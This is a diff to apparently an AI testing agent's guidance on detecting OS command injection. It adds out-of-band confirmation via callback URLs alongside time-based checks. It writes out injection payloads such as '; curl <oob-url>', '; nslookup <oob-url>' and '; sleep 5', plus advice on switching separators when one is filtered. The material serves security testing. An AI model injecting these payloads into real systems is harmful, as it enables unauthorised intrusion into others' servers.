@@ -24,11 +24,22 @@ input.
    Compare the response against the baseline (unmodified input). New content
    in the response matching command output (e.g. `uid=33(www-data)
    gid=33(www-data)`) confirms in-band execution.
-3. **If nothing reflects, go blind/time-based.** Inject a sleep and measure:
-   - `; sleep 5` / `&& sleep 5` / `| sleep 5` (Unix)
-   - `& ping -n 6 127.0.0.1` (Windows, ~5s)
-   A reliable, repeatable multi-second delay on the sleep payload vs baseline
-   confirms execution even with no visible output.
+3. **If nothing reflects, go blind.** Two approaches, prefer OOB when the
+   target likely has outbound network access (usually true for a real
+   server):
+   - **Out-of-band (preferred, stronger signal):** call `generate_oob_url`,
+     inject a command that causes an outbound lookup against it (
+     `; nslookup <oob-url>`, `; curl <oob-url>`, `& nslookup <oob-url>` on
+     Windows), then `poll_oob_interactions` with the same correlation_id. A
+     real DNS/HTTP callback is direct, unambiguous proof of execution — no
+     timing noise, no dependence on network conditions affecting a sleep's
+     apparent duration.
+   - **Time-based (fallback, e.g. outbound network is filtered):** inject a
+     sleep and measure — `; sleep 5` / `&& sleep 5` / `| sleep 5` (Unix),
+     `& ping -n 6 127.0.0.1` (Windows, ~5s). A reliable, repeatable
+     multi-second delay on the sleep payload vs baseline confirms execution
+     even with no visible output, but is noisier (network jitter, server
+     load) than an OOB callback.
 4. **Try multiple separators if the first fails.** Different shells/contexts
    accept different chaining characters — a filtered `;` doesn't mean the
    parameter isn't injectable, just that separator is blocked. Try `|`,
@@ -64,3 +75,5 @@ input.
   value, variant = value + metacharacter chain) if the vulnerable parameter
   is a straightforward query/header value — use it when the payload doesn't
   need timing logic.
+- `generate_oob_url` + `poll_oob_interactions` for the preferred blind
+  confirmation path — see step 3.
